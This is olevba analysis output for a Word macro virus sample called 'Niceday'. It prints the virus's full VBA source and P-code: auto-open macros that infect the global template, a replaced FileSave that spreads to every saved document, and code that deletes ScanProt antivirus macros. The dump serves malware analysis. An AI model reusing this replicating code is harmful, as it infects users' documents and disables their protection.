olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Niceday
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Niceday - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Niceday - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Infects your global template with a virus"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim sMe$
Dim sMacro$
    On Error GoTo -1: On Error GoTo Abort
'   iMacroCount = CountMacros(0, 0)
'   For i = 1 To iMacroCount
'       If MacroName$(i, 0, 0) = "FileSave" Then
'           bTooMuchTrouble = - 1
'       End If
'   Next i
'   If Not bTooMuchTrouble Then
        'add FileSaveAs and copies of AutoOpen and FileSaveAs.
        sMe$ = WordBasic.[FileName$]()
        sMacro$ = sMe$ + ":NEWFS"
        WordBasic.MacroCopy sMacro$, "Global:FileSave"
        sMacro$ = sMe$ + ":NEWFS"
        WordBasic.MacroCopy sMacro$, "Global:NEWFS"
        sMacro$ = sMe$ + ":NEWAO"
        WordBasic.MacroCopy sMacro$, "Global:NEWAO"
'   End If
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO NEWFS.bas 
in file: Virus.MSWord.Niceday - OLE stream: 'Macros/VBA/NEWFS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Infects the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.NEWFS.MAIN"
Dim sMe$
Dim sTMacro$
'this becomes the FileSaveAs for the global template
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Bail
If WordBasic.[Time$]() = "12:01 PM" Then
    WordBasic.MsgBox "Whatya doin' here? Take a lunch break!", "Lunch Time!", 48
End If
WordBasic.CurValues.FileSaveAs dlg
If InStr(WordBasic.[FileName$](), "\") = 0 Then
    WordBasic.Dialog.FileSaveAs dlg
    sMe$ = WordBasic.[FileNameInfo$](dlg.Name, 1)
    WordBasic.FileSaveAs dlg
Else
    sMe$ = WordBasic.[FileName$]()
End If
If dlg.Format = 0 Then dlg.Format = 1
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:NEWAO", sTMacro$
sTMacro$ = sMe$ + ":NEWAO"
WordBasic.MacroCopy "Global:NEWAO", sTMacro$
sTMacro$ = sMe$ + ":NEWFS"
WordBasic.MacroCopy "Global:NEWFS", sTMacro$
WordBasic.ToolsMacro Name:="FileOpen", Show:=1, Delete:=1          'Kill ScanProt!!!
WordBasic.ToolsMacro Name:="AutoExit", Show:=1, Delete:=1          'Kill ScanProt!!!
WordBasic.FileSaveAs dlg
GoTo Done

Bail:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO NEWAO.bas 
in file: Virus.MSWord.Niceday - OLE stream: 'Macros/VBA/NEWAO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Infects your global template with a virus"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.NEWAO.MAIN"
Dim sMe$
Dim sMacro$
    On Error GoTo -1: On Error GoTo Abort
'   iMacroCount = CountMacros(0, 0)
'   For i = 1 To iMacroCount
'       If MacroName$(i, 0, 0) = "FileSave" Then
'           bTooMuchTrouble = - 1
'       End If
'   Next i
'   If Not bTooMuchTrouble Then
        'add FileSaveAs and copies of AutoOpen and FileSaveAs.
        sMe$ = WordBasic.[FileName$]()
        sMacro$ = sMe$ + ":NEWFS"
        WordBasic.MacroCopy sMacro$, "Global:FileSave"
        sMacro$ = sMe$ + ":NEWFS"
        WordBasic.MacroCopy sMacro$, "Global:NEWFS"
        sMacro$ = sMe$ + ":NEWAO"
        WordBasic.MacroCopy sMacro$, "Global:NEWAO"
'   End If
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Niceday
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoOpen - 2629 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn sMe
' Line #3:
' 	Dim 
' 	VarDefn sMacro
' Line #4:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Abort 
' Line #5:
' 	QuoteRem 0x0000 0x0022 "   iMacroCount = CountMacros(0, 0)"
' Line #6:
' 	QuoteRem 0x0000 0x001B "   For i = 1 To iMacroCount"
' Line #7:
' 	QuoteRem 0x0000 0x002F "       If MacroName$(i, 0, 0) = "FileSave" Then"
' Line #8:
' 	QuoteRem 0x0000 0x0020 "           bTooMuchTrouble = - 1"
' Line #9:
' 	QuoteRem 0x0000 0x000D "       End If"
' Line #10:
' 	QuoteRem 0x0000 0x0009 "   Next i"
' Line #11:
' 	QuoteRem 0x0000 0x001E "   If Not bTooMuchTrouble Then"
' Line #12:
' 	QuoteRem 0x0008 0x0035 "add FileSaveAs and copies of AutoOpen and FileSaveAs."
' Line #13:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #14:
' 	Ld sMe$ 
' 	LitStr 0x0006 ":NEWFS"
' 	Add 
' 	St sMacro$ 
' Line #15:
' 	Ld sMacro$ 
' 	LitStr 0x000F "Global:FileSave"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #16:
' 	Ld sMe$ 
' 	LitStr 0x0006 ":NEWFS"
' 	Add 
' 	St sMacro$ 
' Line #17:
' 	Ld sMacro$ 
' 	LitStr 0x000C "Global:NEWFS"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #18:
' 	Ld sMe$ 
' 	LitStr 0x0006 ":NEWAO"
' 	Add 
' 	St sMacro$ 
' Line #19:
' 	Ld sMacro$ 
' 	LitStr 0x000C "Global:NEWAO"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #20:
' 	QuoteRem 0x0000 0x0009 "   End If"
' Line #21:
' 	Label Abort 
' Line #22:
' 	EndSub 
' Macros/VBA/NEWFS - 3000 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn sMe
' Line #3:
' 	Dim 
' 	VarDefn sTMacro
' Line #4:
' 	QuoteRem 0x0000 0x0033 "this becomes the FileSaveAs for the global template"
' Line #5:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #6:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Bail 
' Line #7:
' 	Ld WordBasic 
' 	ArgsMemLd [Time$] 0x0000 
' 	LitStr 0x0008 "12:01 PM"
' 	Eq 
' 	IfBlock 
' Line #8:
' 	LitStr 0x0026 "Whatya doin' here? Take a lunch break!"
' 	LitStr 0x000B "Lunch Time!"
' 	LitDI2 0x0030 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #9:
' 	EndIfBlock 
' Line #10:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #11:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0001 "\"
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #12:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #13:
' 	Ld dlg 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [FileNameInfo$] 0x0002 
' 	St sMe$ 
' Line #14:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #15:
' 	ElseBlock 
' Line #16:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #19:
' 	Ld sMe$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St sTMacro$ 
' Line #20:
' 	LitStr 0x000C "Global:NEWAO"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #21:
' 	Ld sMe$ 
' 	LitStr 0x0006 ":NEWAO"
' 	Add 
' 	St sTMacro$ 
' Line #22:
' 	LitStr 0x000C "Global:NEWAO"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #23:
' 	Ld sMe$ 
' 	LitStr 0x0006 ":NEWFS"
' 	Add 
' 	St sTMacro$ 
' Line #24:
' 	LitStr 0x000C "Global:NEWFS"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #25:
' 	LitStr 0x0008 "FileOpen"
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Show 
' 	LitDI2 0x0001 
' 	ParamNamed Delete 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsMacro 0x0003 
' 	QuoteRem 0x0043 0x0010 "Kill ScanProt!!!"
' Line #26:
' 	LitStr 0x0008 "AutoExit"
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Show 
' 	LitDI2 0x0001 
' 	ParamNamed Delete 
' 	Ld WordBasic 
' 	ArgsMemCall ToolsMacro 0x0003 
' 	QuoteRem 0x0043 0x0010 "Kill ScanProt!!!"
' Line #27:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #28:
' 	GoTo Done 
' Line #29:
' Line #30:
' 	Label Bail 
' Line #31:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0066 
' 	Ne 
' 	IfBlock 
' Line #32:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	Label Done 
' Line #35:
' 	EndSub 
' Macros/VBA/NEWAO - 2335 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn sMe
' Line #3:
' 	Dim 
' 	VarDefn sMacro
' Line #4:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Abort 
' Line #5:
' 	QuoteRem 0x0000 0x0022 "   iMacroCount = CountMacros(0, 0)"
' Line #6:
' 	QuoteRem 0x0000 0x001B "   For i = 1 To iMacroCount"
' Line #7:
' 	QuoteRem 0x0000 0x002F "       If MacroName$(i, 0, 0) = "FileSave" Then"
' Line #8:
' 	QuoteRem 0x0000 0x0020 "           bTooMuchTrouble = - 1"
' Line #9:
' 	QuoteRem 0x0000 0x000D "       End If"
' Line #10:
' 	QuoteRem 0x0000 0x0009 "   Next i"
' Line #11:
' 	QuoteRem 0x0000 0x001E "   If Not bTooMuchTrouble Then"
' Line #12:
' 	QuoteRem 0x0008 0x0035 "add FileSaveAs and copies of AutoOpen and FileSaveAs."
' Line #13:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #14:
' 	Ld sMe$ 
' 	LitStr 0x0006 ":NEWFS"
' 	Add 
' 	St sMacro$ 
' Line #15:
' 	Ld sMacro$ 
' 	LitStr 0x000F "Global:FileSave"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #16:
' 	Ld sMe$ 
' 	LitStr 0x0006 ":NEWFS"
' 	Add 
' 	St sMacro$ 
' Line #17:
' 	Ld sMacro$ 
' 	LitStr 0x000C "Global:NEWFS"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #18:
' 	Ld sMe$ 
' 	LitStr 0x0006 ":NEWAO"
' 	Add 
' 	St sMacro$ 
' Line #19:
' 	Ld sMacro$ 
' 	LitStr 0x000C "Global:NEWAO"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #20:
' 	QuoteRem 0x0000 0x0009 "   End If"
' Line #21:
' 	Label Abort 
' Line #22:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

